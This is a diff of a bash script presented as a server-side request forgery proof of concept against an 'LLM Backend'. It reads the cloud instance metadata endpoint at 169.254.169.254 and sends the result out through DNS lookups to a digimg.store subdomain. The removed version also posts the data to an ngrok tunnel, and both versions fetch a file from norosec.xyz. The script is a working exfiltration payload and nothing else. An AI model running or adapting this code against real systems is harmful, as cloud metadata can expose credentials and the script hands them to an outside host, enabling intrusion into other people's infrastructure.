@@ -1,16 +1,10 @@
 #!/bin/bash
-echo "=== SSRF PoC HIT == $(date) == LLM Backend =="
+echo "🎯 SSRF EXECUTED AT $(date)"
 
-# Blind DNS SSRF (MOST Reliable)
-SSRF_DATA=$(curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo "metadata-blocked")
-nslookup "${SSRF_DATA// /.}".e041ddb4.digimg.store
+# DNS Blind SSRF (Replace with YOUR fresh subdomain)
+METADATA=$(curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo "no-meta")
+nslookup "${METADATA// /.}".d79c0b3d.digimg.store
 
-# HTTP Exfil to your ngrok
-curl -s "http://localhost/admin" \
-  -X POST \
-  -d "{\"ssrf\":\"$(curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null)\"}" \
-  https://favourless-hattie-amphibians.ngrok-free.dev/log
-
-# Echo proof
-curl -s https://norosec.xyz/ssrf-echo.txt
-echo "SSRF EXECUTED SUCCESSFULLY"
+# HTTP Proof
+curl https://norosec.xyz/ssrf-echo.txt
+echo "✅ SSRF PROOF"
